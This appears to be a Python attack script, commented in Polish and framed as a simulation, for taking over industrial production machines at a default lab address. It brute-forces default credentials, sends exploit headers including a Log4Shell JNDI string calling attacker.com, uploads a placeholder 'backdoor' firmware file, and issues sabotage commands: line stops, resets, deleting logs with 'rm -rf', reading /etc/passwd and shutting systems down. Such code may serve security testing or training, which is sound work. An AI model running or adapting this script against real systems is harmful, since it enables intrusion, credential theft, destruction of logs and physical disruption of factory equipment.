#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Skrypt symulujący przejęcie kontroli nad maszynami produkcyjnymi.
"""

import argparse
import logging
import random
import requests
import sys
import time
import json
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Konfiguracja logowania
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('machine_takeover_attack')

# Statystyki ataku
attack_stats = {
    'total_attempts': 0,
    'successful_takeovers': 0,
    'failed_attempts': 0,
    'machines_compromised': [],
    'commands_executed': 0,
    'start_time': None,
    'end_time': None
}

# Blokada dla synchronizacji
stats_lock = threading.Lock()

# Dane do ataków
DEFAULT_CREDENTIALS = [
    ('admin', 'admin'),
    ('admin', 'password'),
    ('admin', '123456'),
    ('operator', 'operator'),
    ('supervisor', 'supervisor'),
    ('root', 'root'),
    ('plc', 'plc'),
    ('maintenance', 'maintenance'),
    ('tech', 'tech123'),
    ('service', 'service'),
    ('factory', 'factory123'),
    ('production', 'prod123')
]

EXPLOIT_HEADERS = {
    'CVE-2020-14750': {
        'User-Agent': 'Mozilla/5.0 CVE-2020-14750',
        'X-Exploit': 'Oracle WebLogic RCE'
    },
    'CVE-2021-44228': {
        'User-Agent': 'Mozilla/5.0 Log4Shell',
        'X-Log4j-Exploit': '${jndi:ldap://attacker.com/exploit}'
    },
    'CVE-2019-19781': {
        'User-Agent': 'Mozilla/5.0 Citrix ADC RCE',
        'X-Citrix-Exploit': 'Path Traversal'
    }
}

MALICIOUS_COMMANDS = [
    {
        'machine': 'machine1',
        'command': 'stop',
        'description': 'Emergency stop of assembly line'
    },
    {
        'machine': 'machine1',
        'command': 'reset',
        'description': 'Force reset causing production loss'
    },
    {
        'machine': 'machine2',
        'command': 'stop',
        'description': 'Stop packaging unit'
    },
    {
        'machine': 'machine2',
        'command': 'reset',
        'description': 'Reset packaging parameters'
    },
    {
        'machine': 'machine1',
        'command': 'exec "rm -rf /var/log/*"',
        'description': 'Delete system logs'
    },
    {
        'machine': 'machine1',
        'command': 'exec "cat /etc/passwd"',
        'description': 'Read sensitive system files'
    },
    {
        'machine': 'machine2',
        'command': 'exec "shutdown -h now"',
        'description': 'Shutdown the system'
    }
]


def parse_arguments():
    """Parsowanie argumentów wiersza poleceń."""
    parser = argparse.ArgumentParser(description='Symulacja przejęcia kontroli nad maszynami produkcyjnymi')
    parser.add_argument('--target', type=str, default='localhost:8002', help='Cel ataku (host:port)')
    parser.add_argument('--method', type=str, choices=['bruteforce', 'exploit', 'malware'], default='bruteforce',
                        help='Metoda ataku')
    parser.add_argument('--threads', type=int, default=5, help='Liczba wątków')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout dla żądań')
    parser.add_argument('--delay', type=int, default=1, help='Opóźnienie między próbami (sekundy)')
    parser.add_argument('--verbose', action='store_true', help='Szczegółowe logowanie')
    parser.add_argument('--output', type=str, help='Plik do zapisu wyników')
    parser.add_argument('--max-attempts', type=int, default=50, help='Maksymalna liczba prób')

    return parser.parse_args()


def bruteforce_login(target_url, credentials_list, timeout=10, verbose=False):
    """
    Przeprowadza atak bruteforce na panel logowania.

    Args:
        target_url (str): URL celu
        credentials_list (list): Lista par (username, password)
        timeout (int): Timeout dla żądań
        verbose (bool): Czy wyświetlać szczegółowe logi

    Returns:
        tuple: (success, username, password, session_cookie)
    """
    login_url = f"http://{target_url}/auth"

    for username, password in credentials_list:
        try:
            if verbose:
                logger.debug(f"Trying credentials: {username}:{password}")

            data = {
                'username': username,
                'password': password
            }

            response = requests.post(login_url, data=data, timeout=timeout, allow_redirects=False)

            with stats_lock:
                attack_stats['total_attempts'] += 1

            # Sprawdzenie czy logowanie się powiodło
            if response.status_code == 200 or 'session_id' in response.cookies:
                logger.info(f"[+] Login successful! Username: {username}, Password: {password}")
                session_cookie = response.cookies.get('session_id', '')

                with stats_lock:
                    attack_stats['successful_takeovers'] += 1

                return True, username, password, session_cookie

            time.sleep(0.5)  # Krótkie opóźnienie między próbami

        except Exception as e:
            if verbose:
                logger.error(f"Error during login attempt: {e}")
            with stats_lock:
                attack_stats['failed_attempts'] += 1

    return False, None, None, None


def exploit_vulnerability(target_url, exploit_name, timeout=10, verbose=False):
    """
    Symuluje wykorzystanie znanej podatności.

    Args:
        target_url (str): URL celu
        exploit_name (str): Nazwa exploita
        timeout (int): Timeout dla żądań
        verbose (bool): Czy wyświetlać szczegółowe logi

    Returns:
        tuple: (success, session_cookie)
    """
    try:
        if exploit_name not in EXPLOIT_HEADERS:
            logger.warning(f"Unknown exploit: {exploit_name}")
            return False, None

        headers = EXPLOIT_HEADERS[exploit_name]

        if verbose:
            logger.debug(f"Attempting exploit: {exploit_name}")

        # Symulacja exploita - próba obejścia autoryzacji
        response = requests.get(f"http://{target_url}/api/system/status", headers=headers, timeout=timeout)

        with stats_lock:
            attack_stats['total_attempts'] += 1

        # Sprawdzenie czy exploit się powiódł
        if response.status_code == 200:
            logger.info(f"[+] Exploit successful: {exploit_name}")

            # Próba utworzenia sesji
            auth_response = requests.post(f"http://{target_url}/auth",
                                          data={'username': 'admin', 'password': 'exploited'},
                                          headers=headers,
                                          timeout=timeout)

            if 'session_id' in auth_response.cookies:
                session_cookie = auth_response.cookies.get('session_id')
                with stats_lock:
                    attack_stats['successful_takeovers'] += 1
                return True, session_cookie

        return False, None

    except Exception as e:
        if verbose:
            logger.error(f"Error during exploit attempt: {e}")
        with stats_lock:
            attack_stats['failed_attempts'] += 1
        return False, None


def upload_malware(target_url, session_cookie, timeout=10, verbose=False):
    """
    Symuluje upload złośliwego oprogramowania.

    Args:
        target_url (str): URL celu
        session_cookie (str): Cookie sesji
        timeout (int): Timeout dla żądań
        verbose (bool): Czy wyświetlać szczegółowe logi

    Returns:
        bool: Czy upload się powiódł
    """
    try:
        headers = {
            'User-Agent': 'Malware-Uploader/1.0',
            'X-Malware': 'PLC-Backdoor'
        }

        cookies = {'session_id': session_cookie} if session_cookie else {}

        # Symulacja uploadu malware
        files = {'firmware': ('backdoor.bin', b'MALICIOUS_PAYLOAD', 'application/octet-stream')}

        response = requests.post(f"http://{target_url}/api/system/firmware",
                                 files=files,
                                 headers=headers,
                                 cookies=cookies,
                                 timeout=timeout)

        if response.status_code == 200:
            logger.info("[+] Malware upload successful!")
            return True

        return False

    except Exception as e:
        if verbose:
            logger.error(f"Error during malware upload: {e}")
        return False


def execute_commands(target_url, session_cookie, commands, timeout=10, verbose=False):
    """
    Wykonuje złośliwe komendy na przejętych maszynach.

    Args:
        target_url (str): URL celu
        session_cookie (str): Cookie sesji
        commands (list): Lista komend do wykonania
        timeout (int): Timeout dla żądań
        verbose (bool): Czy wyświetlać szczegółowe logi

    Returns:
        list: Lista wyników wykonania komend
    """
    results = []
    cookies = {'session_id': session_cookie} if session_cookie else {}

    for cmd in commands:
        try:
            machine = cmd['machine']
            command = cmd['command']
            description = cmd['description']

            if verbose:
                logger.debug(f"Executing: {description}")

            response = requests.post(f"http://{target_url}/api/control/{machine}/{command}",
                                     cookies=cookies,
                                     timeout=timeout)

            if response.status_code == 200:
                logger.info(f"[+] Command executed successfully: {description}")
                results.append({
                    'machine': machine,
                    'command': command,
                    'status': 'success',
                    'response': response.json()
                })

                with stats_lock:
                    attack_stats['commands_executed'] += 1
                    if machine not in attack_stats['machines_compromised']:
                        attack_stats['machines_compromised'].append(machine)
            else:
                results.append({
                    'machine': machine,
                    'command': command,
                    'status': 'failed',
                    'error': response.text
                })

            time.sleep(1)  # Opóźnienie między komendami

        except Exception as e:
            if verbose:
                logger.error(f"Error executing command: {e}")
            results.append({
                'machine': cmd.get('machine', 'unknown'),
                'command': cmd.get('command', 'unknown'),
                'status': 'error',
                'error': str(e)
            })

    return results


def automated_takeover(target_url, method='bruteforce', timeout=10, verbose=False):
    """
    Przeprowadza automatyczne przejęcie kontroli nad systemem.

    Args:
        target_url (str): URL celu
        method (str): Metoda ataku
        timeout (int): Timeout dla żądań
        verbose (bool): Czy wyświetlać szczegółowe logi

    Returns:
        dict: Wyniki ataku
    """
    results = {
        'method': method,
        'success': False,
        'credentials': None,
        'session': None,
        'commands_executed': []
    }

    session_cookie = None

    # Faza 1: Uzyskanie dostępu
    if method == 'bruteforce':
        success, username, password, session_cookie = bruteforce_login(target_url, DEFAULT_CREDENTIALS, timeout,
                                                                       verbose)
        if success:
            results['success'] = True
            results['credentials'] = {'username': username, 'password': password}
            results['session'] = session_cookie

    elif method == 'exploit':
        # Próba różnych exploitów
        for exploit_name in EXPLOIT_HEADERS.keys():
            success, session_cookie = exploit_vulnerability(target_url, exploit_name, timeout, verbose)
            if success:
                results['success'] = True
                results['credentials'] = {'exploit': exploit_name}
                results['session'] = session_cookie
                break

    elif method == 'malware':
        # Najpierw próba uzyskania dostępu przez bruteforce
        success, username, password, session_cookie = bruteforce_login(target_url, DEFAULT_CREDENTIALS[:3], timeout,
                                                                       verbose)
        if success:
            # Następnie upload malware
            malware_success = upload_malware(target_url, session_cookie, timeout, verbose)
            if malware_success:
                results['success'] = True
                results['credentials'] = {'username': username, 'password': password, 'malware': True}
                results['session'] = session_cookie

    # Faza 2: Wykonanie złośliwych komend
    if results['success'] and session_cookie:
        logger.info("[*] Executing malicious commands...")
        command_results = execute_commands(target_url, session_cookie, MALICIOUS_COMMANDS, timeout, verbose)
        results['commands_executed'] = command_results

    return results


def save_results(results, output_file):
    """
    Zapisuje wyniki do pliku.

    Args:
        results (dict): Wyniki ataku
        output_file (str): Ścieżka do pliku
    """
    try:
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=4)
        logger.info(f"Results saved to: {output_file}")
    except Exception as e:
        logger.error(f"Error saving results: {e}")


def display_summary(results):
    """
    Wyświetla podsumowanie ataku.

    Args:
        results (dict): Wyniki ataku
    """
    print("\n=== Machine Takeover Attack Summary ===")
    print(f"Start time: {attack_stats['start_time']}")
    print(f"End time: {attack_stats['end_time']}")
    print(f"Total attempts: {attack_stats['total_attempts']}")
    print(f"Successful takeovers: {attack_stats['successful_takeovers']}")
    print(f"Failed attempts: {attack_stats['failed_attempts']}")
    print(f"Commands executed: {attack_stats['commands_executed']}")
    print(f"Machines compromised: {', '.join(attack_stats['machines_compromised'])}")

    if results['success']:
        print("\n[+] Attack Status: SUCCESSFUL")
        print(f"Method used: {results['method']}")
        if results['credentials']:
            print(f"Credentials: {results['credentials']}")
        print(f"Session ID: {results['session']}")

        if results['commands_executed']:
            print("\nExecuted Commands:")
            for cmd in results['commands_executed']:
                print(f"  - {cmd['machine']}: {cmd['command']} ({cmd['status']})")
    else:
        print("\n[-] Attack Status: FAILED")

    print("=====================================")


def main():
    """Główna funkcja programu."""
    args = parse_arguments()

    # Inicjalizacja statystyk
    attack_stats['start_time'] = datetime.now()

    logger.info("=== Machine Takeover Attack Simulation ===")
    logger.info(f"Target: {args.target}")
    logger.info(f"Method: {args.method}")
    logger.info("========================================\n")

    try:
        # Przeprowadzenie ataku
        results = automated_takeover(args.target, args.method, args.timeout, args.verbose)

        # Zakończenie ataku
        attack_stats['end_time'] = datetime.now()

        # Wyświetlenie podsumowania
        display_summary(results)

        # Zapis wyników jeśli podano plik wyjściowy
        if args.output:
            save_results({
                'attack_results': results,
                'statistics': attack_stats
            }, args.output)

    except KeyboardInterrupt:
        print("\n\nAttack interrupted by user")
        attack_stats['end_time'] = datetime.now()
    except Exception as e:
        logger.error(f"Error during attack: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()


if __name__ == "__main__":
    main()